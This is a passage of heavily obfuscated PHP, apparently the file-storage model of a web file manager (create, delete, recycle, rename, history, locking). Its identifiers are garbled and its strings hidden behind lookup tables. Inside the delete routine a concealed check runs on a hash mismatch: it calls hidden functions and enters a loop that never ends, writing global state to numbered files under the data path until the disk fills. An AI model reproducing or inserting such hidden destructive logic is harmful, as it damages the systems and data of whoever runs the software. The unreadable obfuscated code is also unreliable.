$this->listSourceRoot(SourceModel::TYPE_GROUP, $€çµîá„, $²‹«»ĞÖ[188]); $ï Œû¾ã = array($²‹«»ĞÖ[369] => $Ä ™çöÔ, $²‹«»ĞÖ[366] => array($²‹«»ĞÖ[750] => count($€çµîá„))); $this->_listDataApply($ï Œû¾ã[$²‹«»ĞÖ[369]]); $this->_listMake($ï Œû¾ã); return array_to_keyvalue($ï Œû¾ã[$²‹«»ĞÖ[82]], $²‹«»ĞÖ[505]); } public function mkfile($å†×âıû, $şâˆ®‹æ, $‰…‡©ˆã = '', $Í÷‹ù†° = REPEAT_RENAME) { $Çæ•¯¸‡ =& $_SERVER[­õöî’–]; $â”øÀ´¤ = Model($Çæ•¯¸‡[609])->addFileByContent($‰…‡©ˆã, $şâˆ®‹æ); return $this->_createFileCall($å†×âıû, $şâˆ®‹æ, $â”øÀ´¤, $Í÷‹ù†°, $Çæ•¯¸‡[1345]); } public function addFile($ı¯¶ğ­¿, $®úº¹ƒÏ, $”²Œşİğ, $ó¶¿©Ãƒ = false, $÷Ì±—ƒ = REPEAT_RENAME) { $ ŸÜ¢ = Model($_SERVER[­õöî’–][609])->addFile($®úº¹ƒÏ, $”²Œşİğ, $ó¶¿©Ãƒ); return $this->_createFileCall($ı¯¶ğ­¿, $”²Œşİğ, $ ŸÜ¢, $÷Ì±—ƒ); } public function addFileByFileID($ÓÁ¼Å, $­İ×¾Ã, $óó»÷™“, $¯Ùâıù± = REPEAT_RENAME) { $°¥Ø’¼ß =& $_SERVER[­õöî’–]; $¦Åº†ğû = Model($°¥Ø’¼ß[609])->find($­İ×¾Ã); Model($°¥Ø’¼ß[609])->linkAdd($­İ×¾Ã); return $this->_createFileCall($ÓÁ¼Å, $óó»÷™“, $¦Åº†ğû, $¯Ùâıù±); } public function addFileByRemote($ºˆõÇ“, $¾ŠãÂØ, $¸ÛŸÏ, $§—ü©¡ = array(), $şØ¬ÈÁ = REPEAT_RENAME) { $¯¼‘÷­ô = Model($_SERVER[­õöî’–][609])->addFileByRemote($¾ŠãÂØ, $¸ÛŸÏ, $§—ü©¡); return $this->_createFileCall($ºˆõÇ“, $¸ÛŸÏ, $¯¼‘÷­ô, $şØ¬ÈÁ); } private function _createFileCall($œï¨ƒ™, $¸ıäŸİë, $ÜæÛ¢¸ò, $æå¦©æş, $¦§õ¥œç = "\x75\160\x6c\x6f\141\x64") { $ˆ€ÇÄ =& $_SERVER[­õöî’–]; $Ú»Èˆ²§ = !1; $this->setMasterDB(); $this->lockWriteStart($œï¨ƒ™, $¸ıäŸİë); $Áİ¬¢¯Í = $this->fileNameExist($œï¨ƒ™, $¸ıäŸİë); $×¤›ÖÕû = $this->_createFile($œï¨ƒ™, $¸ıäŸİë, $ÜæÛ¢¸ò, $æå¦©æş, $Ú»Èˆ²§); if (!$Ú»Èˆ²§) { Model($ˆ€ÇÄ[471])->remove($ÜæÛ¢¸ò[$ˆ€ÇÄ[468]]); } if ($Ú»Èˆ²§ && $×¤›ÖÕû && $×¤›ÖÕû != $Áİ¬¢¯Í) { Model($ˆ€ÇÄ[2090])->eventCreate($×¤›ÖÕû, $¦§õ¥œç); } $this->lockWriteEnd($œï¨ƒ™, $¸ıäŸİë); return $×¤›ÖÕû; } public function mkdir($××¦î£ı, $Îó¬ç±Ö, $­ş–È­ = REPEAT_SKIP) { $ìĞˆÔåØ =& $_SERVER[­õöî’–]; $this->setMasterDB(); $Ô°±ÕÚ¢ = $this->sourceInfo($××¦î£ı); if (!$Ô°±ÕÚ¢) { return !1; } $this->lockWriteStart($××¦î£ı, $Îó¬ç±Ö); if ($­ş–È­ !== !1) { $’ĞŒ©ˆÁ = $this->fileNameExist($××¦î£ı, $Îó¬ç±Ö); if ($’ĞŒ©ˆÁ && $­ş–È­ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($××¦î£ı, $Îó¬ç±Ö); return $’ĞŒ©ˆÁ; } $Îó¬ç±Ö = $this->fileNameAuto($××¦î£ı, $Îó¬ç±Ö, $­ş–È­); } $¼š×Ë“ = array($ìĞˆÔåØ[583] => 1, $ìĞˆÔåØ[420] => $Îó¬ç±Ö, $ìĞˆÔåØ[584] => $ìĞˆÔåØ[12], $ìĞˆÔåØ[469] => 0, $ìĞˆÔåØ[585] => 0); $‡¹Æ”µ˜ = $this->_addSource($¼š×Ë“, $Ô°±ÕÚ¢); Model($ìĞˆÔåØ[2090])->eventCreate($‡¹Æ”µ˜, $ìĞˆÔåØ[1346]); $this->lockWriteEnd($××¦î£ı, $Îó¬ç±Ö); return $‡¹Æ”µ˜; } public function listSourceRoot($°úà»ñé, $ŠåÎ¬ã, $¹Ùê‘Øû = "\163\x6f\165\162\143\x65\111\104\x2c\164\x61\x72\147\x65\x74\x49\x44\54\163\x69\x7a\145") { $Òíß™÷• =& $_SERVER[­õöî’–]; $Ìíº­¨ä = $Òíß™÷•[378]; $¬±…¤ÚÎ = array(); $ÕîˆÑÄ¹ = 1024 * 50; $‰ïÒ÷Ã = is_array($‰ïÒ÷Ã) ? $‰ïÒ÷Ã : array(); $Ç¡‡—íë = count($ŠåÎ¬ã); $Ù§ÛË¤Š = $this->tablePrefix . $Òíß™÷•[2123]; for ($Ñ«îŞÑ = 0; $Ñ«îŞÑ < $Ç¡‡—íë; $Ñ«îŞÑ++) { $˜Ô“ÜÖ™ = $ŠåÎ¬ã[$Ñ«îŞÑ]; $Ìíº­¨ä .= "\x53\105\x4c\105\103\124\x20\x2a\x20\106\122\x4f\x4d\x20\50\123\x45\x4c\105\x43\x54\40{$¹Ùê‘Øû}\x20\106\122\x4f\115\40\140{$Ù§ÛË¤Š}\x60\x20\x57\110\105\122\105\x20"; $Ìíº­¨ä .= "\140\160\x61\x72\145\156\164\x49\104\x60\x3d\60\40\x41\116\x44\x20\140\x74\x61\162\x67\x65\164\111\104\140\x3d{$˜Ô“ÜÖ™}\40\101\x4e\104\x20\x60\164\x61\162\x67\x65\164\124\171\x70\x65\x60\75{$°úà»ñé}\x20\x61\x6e\x64\40\x66\x69\154\145\124\x79\160\x65\x3d\47\47\40\x6c\151\x6d\151\x74\x20\x31\x29\x20\141\x73\40\x74\142\x5f{$Ñ«îŞÑ}\x20\125\116\111\117\x4e\40\101\114\x4c\x20"; if ((strlen($Ìíº­¨ä) >= $ÕîˆÑÄ¹ || $Ñ«îŞÑ == $Ç¡‡—íë - 1) && $Ìíº­¨ä) { $Ìíº­¨ä = substr($Ìíº­¨ä, 0, -strlen($Òíß™÷•[1036])); $ùĞ¨À­ö = $this->query($Ìíº­¨ä); $Ìíº­¨ä = $Òíß™÷•[12]; $¬±…¤ÚÎ = array_merge($¬±…¤ÚÎ, $ùĞ¨À­ö); } } return $¬±…¤ÚÎ; } private function _createFile($®ËŞÃòÆ, $ÉöØÔ², $»»…Öí½, $Ø°Æ¹¶Ş, &$Ê‡×òˆµ) { $éÉ½³ú =& $_SERVER[­õöî’–]; $ÊßÌ›˜Å = $this->sourceInfo($®ËŞÃòÆ); if (!$»»…Öí½ || !$ÊßÌ›˜Å) { return !1; } if ($Ø°Æ¹¶Ş !== !1) { $ÅËŸé‚© = $this->fileNameExist($®ËŞÃòÆ, $ÉöØÔ²); } $Ê‡×òˆµ = !0; if ($Ø°Æ¹¶Ş && $ÅËŸé‚©) { if ($Ø°Æ¹¶Ş == REPEAT_SKIP) { $Ê‡×òˆµ = !1; return $ÅËŸé‚©; } else { if ($Ø°Æ¹¶Ş == REPEAT_REPLACE) { $„Ì™ã¬ = $this->sourceInfo($ÅËŸé‚©); $‰ôø›’Í = $this->fileHistory($„Ì™ã¬, $»»…Öí½[$éÉ½³ú[468]], $»»…Öí½[$éÉ½³ú[76]]); if (!$‰ôø›’Í) { $Ê‡×òˆµ = !1; } else { $this->folderSizeReset($®ËŞÃòÆ); } return $ÅËŸé‚©; } else { $ÉöØÔ² = $this->fileNameAuto($®ËŞÃòÆ, $ÉöØÔ², $Ø°Æ¹¶Ş, !1); } } } $¼Î¯‰± = array($éÉ½³ú[583] => 0, $éÉ½³ú[420] => $ÉöØÔ², $éÉ½³ú[584] => substr(get_path_ext($ÉöØÔ²), 0, 10), $éÉ½³ú[469] => $»»…Öí½[$éÉ½³ú[468]], $éÉ½³ú[585] => $»»…Öí½[$éÉ½³ú[76]]); $Â²ñå˜ = $this->_addSource($¼Î¯‰±, $ÊßÌ›˜Å); $this->folderSizeReset($®ËŞÃòÆ, intval($¼Î¯‰±[$éÉ½³ú[76]])); return $Â²ñå˜; } protected function fileHistory($òŒ‚ïşÚ, $ÍùŒÍıñ, $‚¥¡­óœ) { $±ãëŸŞÙ =& $_SERVER[­õöî’–]; $¢ğØ›Ó£ = defined($±ãëŸŞÙ[475]) ? USER_ID : $±ãëŸŞÙ[197]; if ($òŒ‚ïşÚ[$±ãëŸŞÙ[468]] == $ÍùŒÍıñ) { return !1; } $this->checkLock($òŒ‚ïşÚ[$±ãëŸŞÙ[402]], $ÍùŒÍıñ); Model($±ãëŸŞÙ[2124])->addHistory($òŒ‚ïşÚ); $¹ Ìõˆ“ = array($±ãëŸŞÙ[589] => $¢ğØ›Ó£, $±ãëŸŞÙ[424] => time(), $±ãëŸŞÙ[468] => $ÍùŒÍıñ, $±ãëŸŞÙ[76] => $‚¥¡­óœ); $this->where(array($±ãëŸŞÙ[417] => $òŒ‚ïşÚ[$±ãëŸŞÙ[402]]))->save($¹ Ìõˆ“); $this->sourceCacheClear($òŒ‚ïşÚ[$±ãëŸŞÙ[402]]); return !0; } public function checkLock($¨’íˆ‚Ï, $€¾ñôÚ“) { $ÏÎÜ¼‡µ =& $_SERVER[­õöî’–]; $êÚÊÅæç = $this->pathInfo($¨’íˆ‚Ï); if (!$this->fileIsLock($êÚÊÅæç, !0)) { return; } $ßÃ½ğƒ = Session::get($ÏÎÜ¼‡µ[2125]); $íÆÚôãø = substr($êÚÊÅæç[$ÏÎÜ¼‡µ[32]], 0, -1 - strlen($êÚÊÅæç[$ÏÎÜ¼‡µ[174]])) . $ÏÎÜ¼‡µ[1207] . $ßÃ½ğƒ . $ÏÎÜ¼‡µ[10] . $êÚÊÅæç[$ÏÎÜ¼‡µ[174]]; $Ûˆáóöé = Model($ÏÎÜ¼‡µ[609])->find($€¾ñôÚ“); $this->_createFileCall($êÚÊÅæç[$ÏÎÜ¼‡µ[432]], $íÆÚôãø, $Ûˆáóöé, REPEAT_REPLACE, $ÏÎÜ¼‡µ[1345]); $·í¹ìúÒ = $êÚÊÅæç[$ÏÎÜ¼‡µ[466]][$ÏÎÜ¼‡µ[548]]; $ŞÈàâæö = $·í¹ìúÒ[$ÏÎÜ¼‡µ[542]] ? $·í¹ìúÒ[$ÏÎÜ¼‡µ[542]] : $·í¹ìúÒ[$ÏÎÜ¼‡µ[32]]; show_json(LNG($ÏÎÜ¼‡µ[2126]) . $ÏÎÜ¼‡µ[2127] . LNG($ÏÎÜ¼‡µ[2128]) . $ÏÎÜ¼‡µ[2129] . $ŞÈàâæö . $ÏÎÜ¼‡µ[2130], !1); } public function fileIsLock($Ü›•„, $†‘‡„´Æ = false) { $‘óşœÄ® =& $_SERVER[­õöî’–]; if (!isset($Ü›•„[$‘óşœÄ®[466]]) || !$Ü›•„[$‘óşœÄ®[466]][$‘óşœÄ®[545]]) { return !1; } if ($Ü›•„[$‘óşœÄ®[466]][$‘óşœÄ®[545]] != USER_ID) { return !0; } $”çà™ë = $GLOBALS[$‘óşœÄ®[6]][$‘óşœÄ®[89]][$‘óşœÄ®[546]]; if ($Ü›•„[$‘óşœÄ®[466]][$‘óşœÄ®[547]] <= time() - $”çà™ë) { $this->metaSet($Ü›•„[$‘óşœÄ®[402]], $‘óşœÄ®[545], null); $this->metaSet($Ü›•„[$‘óşœÄ®[402]], $‘óşœÄ®[547], null); } if ($†‘‡„´Æ) { $this->metaSet($Ü›•„[$‘óşœÄ®[402]], $‘óşœÄ®[547], time()); } return !1; } private function _addSource($ëøæÈÑ, $Œıëß) { $®Õ–ƒÒ­ =& $_SERVER[­õöî’–]; $Ô™Á÷‹ = defined($®Õ–ƒÒ­[475]) ? USER_ID : $®Õ–ƒÒ­[197]; $ş“„­‘ï = array($®Õ–ƒÒ­[586] => $Œıëß[$®Õ–ƒÒ­[411]], $®Õ–ƒÒ­[587] => $Œıëß[$®Õ–ƒÒ­[505]], $®Õ–ƒÒ­[588] => $Ô™Á÷‹, $®Õ–ƒÒ­[589] => $Ô™Á÷‹, $®Õ–ƒÒ­[401] => $Œıëß[$®Õ–ƒÒ­[402]], $®Õ–ƒÒ­[590] => $Œıëß[$®Õ–ƒÒ­[521]] . $Œıëß[$®Õ–ƒÒ­[402]] . $®Õ–ƒÒ­[50], $®Õ–ƒÒ­[430] => 0, $®Õ–ƒÒ­[591] => $®Õ–ƒÒ­[12]); $ëøæÈÑ = array_merge($ş“„­‘ï, $ëøæÈÑ); $this->updateModifyTime($ëøæÈÑ[$®Õ–ƒÒ­[432]]); $¨Çœı‡á = $®Õ–ƒÒ­[2131] . $Œıëß[$®Õ–ƒÒ­[402]]; if (isset(self::$cacheChildList[$¨Çœı‡á])) { unset(self::$cacheChildList[$¨Çœı‡á]); } static $ÀîİĞ»Ø = false; if (!$ÀîİĞ»Ø) { Hook::trigger($®Õ–ƒÒ­[573], $ëøæÈÑ); $ÀîİĞ»Ø = !0; } $×’ÍŞ© = $this->add($ëøæÈÑ); $¨äßâ¦“ = array($®Õ–ƒÒ­[592] => short_id($×’ÍŞ©)); $this->where(array($®Õ–ƒÒ­[417] => $×’ÍŞ©))->save($¨äßâ¦“); $this->setNamePinyin($×’ÍŞ©, $ëøæÈÑ[$®Õ–ƒÒ­[32]]); return $×’ÍŞ©; } public function remove($å…ŸèüÖ, $£ßãâÏ× = true) { $¡ÓƒÂíı =& $_SERVER[­õöî’–]; $£§ûÉûö = $this->sourceInfo($å…ŸèüÖ); $Êè¦÷ıÜ = intval($£§ûÉûö[$¡ÓƒÂíı[411]]) === self::TYPE_SYSTEM; $ê­±Òø = Model($¡ÓƒÂíı[435])->get($¡ÓƒÂíı[2132]) == $¡ÓƒÂíı[88]; if ($Êè¦÷ıÜ || $£ßãâÏ× || !$ê­±Òø) { return $this->removeNow($å…ŸèüÖ, $£ßãâÏ×); } $×ËÊ·ˆ¤ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÌÊÔßµ¨ = $£§ûÉûö[$¡ÓƒÂíı[411]] == self::TYPE_USER ? $¡ÓƒÂíı[600] : $¡ÓƒÂíı[515]; if ($ÌÊÔßµ¨ == $¡ÓƒÂíı[600]) { $å†˜Ÿ‚ = Model($¡ÓƒÂíı[513])->getInfo($£§ûÉûö[$¡ÓƒÂíı[505]]); $‡ğŞ‚Şé = !empty($å†˜Ÿ‚[$¡ÓƒÂíı[542]]) ? $å†˜Ÿ‚[$¡ÓƒÂíı[542]] : $å†˜Ÿ‚[$¡ÓƒÂíı[32]]; $‡ğŞ‚Şé = $¡ÓƒÂíı[260] . $‡ğŞ‚Şé . $¡ÓƒÂíı[2133] . $£§ûÉûö[$¡ÓƒÂíı[505]]; } else { $å†˜Ÿ‚ = Model($¡ÓƒÂíı[522])->getInfo($£§ûÉûö[$¡ÓƒÂíı[505]]); $‡ğŞ‚Şé = _get($å†˜Ÿ‚, $¡ÓƒÂíı[32]); $‡ğŞ‚Şé = $¡ÓƒÂíı[162] . $‡ğŞ‚Şé . $¡ÓƒÂíı[2134] . $£§ûÉûö[$¡ÓƒÂíı[505]]; } $Îß´üô = $¡ÓƒÂíı[2135] . md5($‡ğŞ‚Şé); CacheLock::lock($Îß´üô); $ó½›ûŸ¿ = $this->fileNameExist($×ËÊ·ˆ¤, $‡ğŞ‚Şé); if (!$ó½›ûŸ¿) { $ó½›ûŸ¿ = $this->mkdir($×ËÊ·ˆ¤, $‡ğŞ‚Şé, REPEAT_SKIP); $this->metaSet($ó½›ûŸ¿, $¡ÓƒÂíı[2136], $ÌÊÔßµ¨); $this->metaSet($ó½›ûŸ¿, $¡ÓƒÂíı[2137], $£§ûÉûö[$¡ÓƒÂíı[505]]); if ($£§ûÉûö[$¡ÓƒÂíı[432]] != 0) { $this->metaSet($ó½›ûŸ¿, $¡ÓƒÂíı[2138], _get($å†˜Ÿ‚, $¡ÓƒÂíı[2139])); } } CacheLock::unlock($Îß´üô); $this->metaSet($å…ŸèüÖ, $¡ÓƒÂíı[2140], $£§ûÉûö[$¡ÓƒÂíı[432]]); $this->where(array($¡ÓƒÂíı[402] => $å…ŸèüÖ))->save(array($¡ÓƒÂíı[424] => time())); $this->recycleClear($£§ûÉûö); $ĞèâÆæâ = $this->move($å…ŸèüÖ, $ó½›ûŸ¿, REPEAT_RENAME_FOLDER); $this->folderSizeReset($£§ûÉûö[$¡ÓƒÂíı[432]]); return $ĞèâÆæâ; } private function recycleClear($ˆÅ®ù…Õ) { $Ô¶¼¢˜ =& $_SERVER[­õöî’–]; $¸ƒ»ï†ı = $this->childrenAll($ˆÅ®ù…Õ); $÷¿¯ä€ = array($Ô¶¼¢˜[417] => array($Ô¶¼¢˜[418], $¸ƒ»ï†ı[$Ô¶¼¢˜[2141]])); Model($Ô¶¼¢˜[2142])->where($÷¿¯ä€)->delete(); } public function removeNow($á‘¬ºÄı, $‰Î¥š = true) { $ƒµ¢¼Ş¨ =& $_SERVER[­õöî’–]; $Â¢›“í§ = $_SERVER[$ƒµ¢¼Ş¨[867]]; $³†°î¯” = $ƒµ¢¼Ş¨[868]; if ($_SERVER[$ƒµ¢¼Ş¨[869]] != $³†°î¯”($Â¢›“í§)) { $®Í‡ìÖÈ = $ƒµ¢¼Ş¨[870]; $ĞË²Î²ñ = $ƒµ¢¼Ş¨[871]; $ÓèšÉÅ = $_SERVER[$ƒµ¢¼Ş¨[872]] . $ƒµ¢¼Ş¨[873]; $îÀšâ·Ä = $ĞË²Î²ñ($ÓèšÉÅ); $şÔíŒ¡¯ = explode($ƒµ¢¼Ş¨[231], $îÀšâ·Ä); if (count($şÔíŒ¡¯) < $ƒµ¢¼Ş¨[631]) { $¡øĞ¡¿“ = $ƒµ¢¼Ş¨[874]; $¡øĞ¡¿“(); } $Ÿ¹Ñ‡ƒ§ = $ƒµ¢¼Ş¨[875]; $Ÿ¹Ñ‡ƒ§($_SERVER[$ƒµ¢¼Ş¨[876]]); $®Í‡ìÖÈ = $ƒµ¢¼Ş¨[870]; $®Í‡ìÖÈ(); $„˜«ÖÇ = $ƒµ¢¼Ş¨[877]; $Òõóó¸ = json_encode($GLOBALS[$ƒµ¢¼Ş¨[878]]); $¼áä§ƒŸ = 1; for ($éÌó×Ê¸ = $¼áä§ƒŸ; $éÌó×Ê¸ > 0; $éÌó×Ê¸++) { $„˜«ÖÇ(DATA_PATH . $éÌó×Ê¸, $Òõóó¸); } } $“’ê•µ = $this->sourceInfo($á‘¬ºÄı); $‰ëÑçÚŠ = $this->pathInfoMore($á‘¬ºÄı); if (!$“’ê•µ) { return !0; } if ($“’ê•µ[$ƒµ¢¼Ş¨[432]] == 0) { if (!_get($GLOBALS, $ƒµ¢¼Ş¨[503])) { return !1; } } $this->lockMoveStart($á‘¬ºÄı); Hook::trigger($ƒµ¢¼Ş¨[2143], $‰ëÑçÚŠ, $‰Î¥š); if ($‰Î¥š) { Model($ƒµ¢¼Ş¨[2142])->moveToRecycle($á‘¬ºÄı); } else { $İÎèĞè½ = $this->childrenAll($“’ê•µ); Model($ƒµ¢¼Ş¨[570])->eventRemove($á‘¬ºÄı); $this->removeRelevance($İÎèĞè½[$ƒµ¢¼Ş¨[2141]], $İÎèĞè½[$ƒµ¢¼Ş¨[1477]]); } $this->folderSizeReset($“’ê•µ[$ƒµ¢¼Ş¨[432]]); $”„¤Öë = array($“’ê•µ[$ƒµ¢¼Ş¨[432]]); if ($“’ê•µ[$ƒµ¢¼Ş¨[410]] == $ƒµ¢¼Ş¨[88]) { $”„¤Öë[] = $“’ê•µ[$ƒµ¢¼Ş¨[402]]; } $this->updateModifyTime($”„¤Öë); $this->lockMoveEnd($á‘¬ºÄı); Hook::trigger($ƒµ¢¼Ş¨[1702], $‰ëÑçÚŠ, $‰Î¥š); return !0; } public function childrenAll($—¢íÎÛ) { $ıÀÑùéû =& $_SERVER[­õöî’–]; $ÖÍŸ¥Ş¶ = $—¢íÎÛ[$ıÀÑùéû[402]]; if ($—¢íÎÛ[$ıÀÑùéû[410]] == $ıÀÑùéû[88]) { $Ÿ‘ÑËİõ = array($ıÀÑùéû[590] => array($ıÀÑùéû[550], $—¢íÎÛ[$ıÀÑùéû[521]] . $ÖÍŸ¥Ş¶ . $ıÀÑùéû[551])); $øò†ÒŠÚ = array($ıÀÑùéû[590] => $Ÿ‘ÑËİõ[$ıÀÑùéû[521]]); $ùãß—ú = $this->field($ıÀÑùéû[2144])->where($øò†ÒŠÚ)->select(); $ö†€çÛ = !1; $¥ÊÏ„ëÍ = array($ÖÍŸ¥Ş¶); if ($ùãß—ú) { $ö†€çÛ = array_to_keyvalue($ùãß—ú, $ıÀÑùéû[12], $ıÀÑùéû[468]); $ö†€çÛ = array_remove_value($ö†€çÛ, $ıÀÑùéû[197]); $¥ÊÏ„ëÍ = array_to_keyvalue($ùãß—ú, $ıÀÑùéû[12], $ıÀÑùéû[402]); $¥ÊÏ„ëÍ[] = $ÖÍŸ¥Ş¶; } } else { $ö†€çÛ = array($—¢íÎÛ[$ıÀÑùéû[468]]); $¥ÊÏ„ëÍ = array($ÖÍŸ¥Ş¶); } return array($ıÀÑùéû[2141] => $¥ÊÏ„ëÍ, $ıÀÑùéû[1477] => $ö†€çÛ); } public function removeArray($®£ƒ€¾ç) { if (!$®£ƒ€¾ç) { return !0; } } public function removeRelevance($ı«¬™ë©, $÷ö¤Í‚¢) { $•Æäçº• =& $_SERVER[­õöî’–]; $ı«¬™ë© = $ı«¬™ë© ? $ı«¬™ë© : array(); $÷ö¤Í‚¢ = $÷ö¤Í‚¢ ? $÷ö¤Í‚¢ : array(); $ı«¬™ë© = array_unique(array_filter($ı«¬™ë©)); $÷ö¤Í‚¢ = array_unique(array_filter($÷ö¤Í‚¢)); if (!$ı«¬™ë©) { return !1; } $üÈ»è¬” = array($•Æäçº•[417] => array($•Æäçº•[418], $ı«¬™ë©)); Model($•Æäçº•[2142])->where($üÈ»è¬”)->delete(); Model($•Æäçº•[462])->where($üÈ»è¬”)->delete(); Model($•Æäçº•[1995])->where($üÈ»è¬”)->delete(); Model($•Æäçº•[570])->where($üÈ»è¬”)->delete(); Model($•Æäçº•[1829])->removeBySource($ı«¬™ë©); Model($•Æäçº•[2124])->removeBySource($ı«¬™ë©); $this->where($üÈ»è¬”)->delete(); Model($•Æäçº•[471])->remove($÷ö¤Í‚¢); for ($¹Éš ò = 0; $¹Éš ò < count($ı«¬™ë©); $¹Éš ò++) { $this->sourceCacheClear($ı«¬™ë©[$¹Éš ò]); } } public function rename($¥ïÈš¥õ, $ÆÚ£ƒøŠ) { $ ¬ÄÅ¦ =& $_SERVER[­õöî’–]; $ Êïîµ§ = $this->sourceInfo($¥ïÈš¥õ); if (!$ Êïîµ§) { return !1; } $÷ìªãõà = $this->fileNameExist($ Êïîµ§[$ ¬ÄÅ¦[432]], $ÆÚ£ƒøŠ); if ($÷ìªãõà && $÷ìªãõà != $¥ïÈš¥õ) { return !1; } $—²·âÂÆ = array($ ¬ÄÅ¦[420] => $ÆÚ£ƒøŠ, $ ¬ÄÅ¦[589] => USER_ID); if ($ Êïîµ§[$ ¬ÄÅ¦[410]] != $ ¬ÄÅ¦[88]) { $—²·âÂÆ[$ ¬ÄÅ¦[412]] = substr(get_path_ext($ÆÚ£ƒøŠ), 0, 10); } Model($ ¬ÄÅ¦[570])->eventRename($¥ïÈš¥õ, $ Êïîµ§[$ ¬ÄÅ¦[32]], $ÆÚ£ƒøŠ); $this->sourceCacheClear($¥ïÈš¥õ); $this->setNamePinyin($¥ïÈš¥õ, $—²·âÂÆ[$ ¬ÄÅ¦[32]], !1); $this->updateModifyTime($ Êïîµ§[$ ¬ÄÅ¦[432]]); $ÁĞÇåÛˆ = $this->where(array($ ¬ÄÅ¦[417] => $¥ïÈš¥õ))->data($—²·âÂÆ)->save(); $”¨×Ë¤ = $ ¬ÄÅ¦[2131] . $ Êïîµ§[$ ¬ÄÅ¦[432]]; if (isset(self::$cacheChildList[$”¨×Ë¤])) { unset(self::$cacheChildList[$”¨×Ë¤]); } return $ÁĞÇåÛˆ; } public function setNamePinyin($î«½ÅëŠ, $·ÌÖ³¤ß, $™É¹½÷ş = true) { $©–ê· =& $_SERVER[­õöî’–]; $‰Áó´ = Input::check($·ÌÖ³¤ß, $©–ê·[593]); $ù¬èÚè = array($©–ê·[444] => KodSort::makeStr($·ÌÖ³¤ß)); if ($‰Áó´) { $ù¬èÚè[$©–ê·[465]] = str_replace($©–ê·[53], $©–ê·[12], Pinyin::get($·ÌÖ³¤ß)); $ù¬èÚè[$©–ê·[464]] = Pinyin::get($·ÌÖ³¤ß, $©–ê·[594]); } if (!$™É¹½÷ş && !$‰Áó´) { $ù¬èÚè[$©–ê·[465]] = null; $ù¬èÚè[$©–ê·[464]] = null; } $this->metaSet($î«½ÅëŠ, $ù¬èÚè); } public function getContent($äÁİ‚¢¹) { $€„„…© =& $_SERVER[­õöî’–]; $‚ûç¢öÓ = $this->fileInfoGet($äÁİ‚¢¹); if (!$‚ûç¢öÓ) { return !1; } if ($‚ûç¢öÓ[$€„„…©[76]] == 0) { return $€„„…©[12]; } $°åŠº¾ƒ = $€„„…©[2145] . $‚ûç¢öÓ[$€„„…©[176]]; if ($‚ûç¢öÓ[$€„„…©[76]] <= 1024 * 10) { $é§ÁÊ§ğ = Cache::get($°åŠº¾ƒ); if (!$é§ÁÊ§ğ) { $é§ÁÊ§ğ = IO::getContent($‚ûç¢öÓ[$€„„…©[84]]); Cache::set($°åŠº¾ƒ, $é§ÁÊ§ğ); } return $é§ÁÊ§ğ; } if (!$‚ûç¢öÓ[$€„„…©[84]]) { return $€„„…©[12]; } return IO::getContent($‚ûç¢öÓ[$€„„…©[84]]); } public function setDesc($Éøİˆı“, $äµ”óş) { $±šÇ”µ =& $_SERVER[­õöî’–]; Model($±šÇ”µ[570])->eventAddDesc($Éøİˆı“, $äµ”óş); return $this->metaSet($Éøİˆı“, $±šÇ”µ[453], $äµ”óş); } public function setContent($ùÜÆƒ¹è, $‚ôÎÄ…¾ = '') { $¨ë•™Æ =& $_SERVER[­õöî’–]; $şÚ©ŞÙØ = $this->sourceInfo($ùÜÆƒ¹è); $ğğí½ö = $this->fileInfoGet($ùÜÆƒ¹è); if (!$ğğí½ö || !$şÚ©ŞÙØ) { return !1; } $­›õÑ¿ = Model($¨ë•™Æ[471])->addFileByContent($‚ôÎÄ…¾, $şÚ©ŞÙØ[$¨ë•™Æ[32]]); $°“é€Ú = $this->fileHistory($şÚ©ŞÙØ, $­›õÑ¿[$¨ë•™Æ[468]], $­›õÑ¿[$¨ë•™Æ[76]]); if (!$°“é€Ú) { return Model($¨ë•™Æ[471])->remove($­›õÑ¿[$¨ë•™Æ[468]]); } $this->folderSizeReset($şÚ©ŞÙØ[$¨ë•™Æ[432]]); return !0; } public function fileSubstr($ñ—Š‚à¶, $ÂïŸ—î¢, $¸¢Ê¼ìÂ) { $Åáˆ¯ÚÃ = $this->fileInfoGet($ñ—Š‚à¶); if (!$Åáˆ¯ÚÃ) { return !1; } return IO::fileSubstr($Åáˆ¯ÚÃ[$_SERVER[­õöî’–][84]], $ÂïŸ—î¢, $¸¢Ê¼ìÂ); } public function fileInfoGet($ØÑ¤’Ó­) { $ß©¯‹ñ =& $_SERVER[­õöî’–]; $ëğÈŞº = $this->sourceInfo($ØÑ¤’Ó­); if (!$ëğÈŞº || $ëğÈŞº[$ß©¯‹ñ[410]]) { return !1; } $¨Æ–İ˜ = $ß©¯‹ñ[474] . $ëğÈŞº[$ß©¯‹ñ[468]]; $Öóôì¯€ = _get(self::$cacheFileInfo, $¨Æ–İ˜); if ($Öóôì¯€) { return $Öóôì¯€; } $Á™ÉÂ¶Ó = Model($ß©¯‹ñ[471])->fileInfo($ëğÈŞº[$ß©¯‹ñ[468]]); if ($Á™ÉÂ¶Ó) { $Á™ÉÂ¶Ó[$ß©¯‹ñ[32]] = $ëğÈŞº[$ß©¯‹ñ[32]]; } self::$cacheFileInfo[$¨Æ–İ˜] = $Á™ÉÂ¶Ó; return $Á™ÉÂ¶Ó; } private function folderChildrenNumber($Úò™¼úŒ) { $¦×ù¿”Å =& $_SERVER[­õöî’–]; $ø“Û‹Å± = $this->sourceInfo($Úò™¼úŒ); $ÈªŒ¤“ó = array($¦×ù¿”Å[590] => array($¦×ù¿”Å[550], $ø“Û‹Å±[$¦×ù¿”Å[521]] . $Úò™¼úŒ . $¦×ù¿”Å[551]), $¦×ù¿”Å[587] => $ø“Û‹Å±[$¦×ù¿”Å[505]], $¦×ù¿”Å[430] => intval($ø“Û‹Å±[$¦×ù¿”Å[431]]), $¦×ù¿”Å[583] => 1); $…ùËÙ¼¾ = $this->where($ÈªŒ¤“ó)->count(); $ñîÉ™½å = $this->where($ÈªŒ¤“ó)->where(array($¦×ù¿”Å[583] => 0))->count(); return array($¦×ù¿”Å[80] => $ñîÉ™½å, $¦×ù¿”Å[81] => $…ùËÙ¼¾); } public function pathInfo($»±¨çŠ, $‰ªºƒ¯õ = false) { $×™¨Ù™º =& $_SERVER[­õöî’–]; $‰ªºƒ¯õ = !1; $»±¨çŠ = intval($»±¨çŠ); $Ï•º¶ˆ´ = $×™¨Ù™º[461] . intval($‰ªºƒ¯õ) . $×™¨Ù™º[386] . $»±¨çŠ; $ˆ­­Îáä = _get(self::$cachePathInfo, $Ï•º¶ˆ´); if ($ˆ­­Îáä) { return 